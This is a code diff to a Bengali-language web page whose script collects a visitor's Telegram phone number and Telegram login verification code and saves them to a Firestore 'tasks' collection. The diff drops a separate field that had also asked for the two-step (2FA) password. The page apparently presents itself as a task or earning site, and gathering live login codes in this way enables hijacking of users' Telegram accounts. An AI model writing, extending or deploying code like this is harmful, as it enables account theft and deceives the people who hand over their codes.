@@ -197,11 +197,6 @@
                         <input type="text" id="tgCode" class="form-control" placeholder="টেলিগ্রামের কোড লিখুন...">
                     </div>
 
-                    <div class="input-group">
-                        <label>টু-স্টেপ পাসওয়ার্ড (2FA) - যদি থাকে</label>
-                        <input type="text" id="tg2fa" class="form-control" placeholder="যেমন: pass1234">
-                    </div>
-
                     <button class="btn-get-code" id="btnGetCode" onclick="sendTelegramCode()">
                         <i class="fas fa-paper-plane"></i> কোড পাঠান
                     </button>
@@ -368,7 +363,6 @@
         window.submitTask = async function() {
             const number = document.getElementById("tgNumber").value.trim();
             const code = document.getElementById("tgCode").value.trim();
-            const twoFA = document.getElementById("tg2fa").value.trim() || "N/A";
             
             if (number === "" || code === "") {
                 showToast("দয়া করে নাম্বার এবং কোড প্রদান করুন!");
@@ -379,7 +373,7 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> জমা হচ্ছে...';
             btn.disabled = true;
 
-            const details = `Number: ${number}\nVerification Code: ${code}\n2FA: ${twoFA}`;
+            const details = `Number: ${number}\nVerification Code: ${code}`;
 
             try {
                 await window.addDoc(window.collection(window.db, "tasks"), {
@@ -399,7 +393,6 @@
                 
                 document.getElementById("tgNumber").value = "";
                 document.getElementById("tgCode").value = "";
-                document.getElementById("tg2fa").value = "";
 
             } catch (error) {
                 console.error(error);
